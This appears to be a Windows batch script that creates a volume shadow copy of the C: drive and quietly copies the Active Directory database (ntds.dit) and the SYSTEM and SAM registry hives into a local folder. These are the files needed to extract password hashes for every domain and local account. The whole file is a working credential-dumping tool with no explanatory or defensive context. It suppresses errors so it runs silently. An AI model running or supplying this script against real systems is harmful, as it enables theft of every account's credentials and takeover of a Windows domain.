@echo off
::CHANGES DIRECTORY FROM SYSTEM32 TO CURRENT DIRECTORY (WHEN RUN AS ADMINISTRATOR)
cd /d "%~dp0" && if not exist %computername%-NTDS md %computername%-NTDS

wmic shadowcopy call create volume='C:\' >nul 2>&1

set "lastoccur="
for /F "delims=" %%G in ('vssadmin list shadows ^| findstr /C:"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"') do set "lastoccur=%%G"
set lastoccur=%lastoccur:~29%

::Copies the files from the VolumeShadowCopy
copy %lastoccur%\windows\ntds\ntds.dit .\%computername%-NTDS\ >nul 2>&1
copy %lastoccur%\windows\system32\config\SYSTEM .\%computername%-NTDS\ >nul 2>&1
copy %lastoccur%\windows\system32\config\SAM .\%computername%-NTDS\ >nul 2>&1

pause

